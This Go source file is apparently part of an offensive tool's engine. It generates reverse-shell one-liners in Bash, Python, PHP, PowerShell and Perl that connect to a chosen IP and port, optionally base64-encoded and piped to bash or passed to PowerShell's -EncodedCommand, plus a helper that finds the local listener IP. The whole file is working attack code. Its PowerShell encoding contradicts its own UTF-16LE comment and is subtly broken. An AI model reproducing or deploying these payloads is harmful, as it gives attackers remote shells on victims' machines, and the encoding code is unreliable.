package engine

import (
	"encoding/base64"
	"fmt"
	"net"
)

// PayloadType represents types of reverse shells
type PayloadType string

const (
	BashShell       PayloadType = "Bash"
	PythonShell     PayloadType = "Python"
	PHPShell        PayloadType = "PHP"
	PowerShellShell PayloadType = "PowerShell"
	PerlShell       PayloadType = "Perl"
)

// GenerateReverseShell creates an encoded reverse shell payload
func GenerateReverseShell(pType PayloadType, ip string, port int, encoder string) string {
	var payload string
	switch pType {
	case BashShell:
		payload = fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", ip, port)
	case PythonShell:
		payload = fmt.Sprintf("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", ip, port)
	case PHPShell:
		payload = fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", ip, port)
	case PowerShellShell:
		payload = fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient(\"%s\",%d);$stream = $client.GetStream();$reader = New-Object System.IO.StreamReader($stream);$writer = New-Object System.IO.StreamWriter($stream);$writer.AutoFlush = $true;$buffer = New-Object System.Byte[] 1024;while(($byteCount = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($buffer, 0, $byteCount);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$byteattr = (New-Object System.Text.ASCIIEncoding).GetBytes($sendback2);$stream.Write($byteattr, 0, $byteattr.Length);$stream.Flush()};$client.Close()", ip, port)
	case PerlShell:
		payload = fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", ip, port)
	}

	if encoder == "base64" {
		if pType == PowerShellShell {
			// PowerShell needs UTF-16LE for base64 encoded command
			return "powershell -EncodedCommand " + base64.StdEncoding.EncodeToString([]byte(payload))
		}
		return "echo " + base64.StdEncoding.EncodeToString([]byte(payload)) + " | base64 -d | bash"
	}

	return payload
}

// GetLIP returns the local IP for payload generation
func GetLIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "127.0.0.1"
}
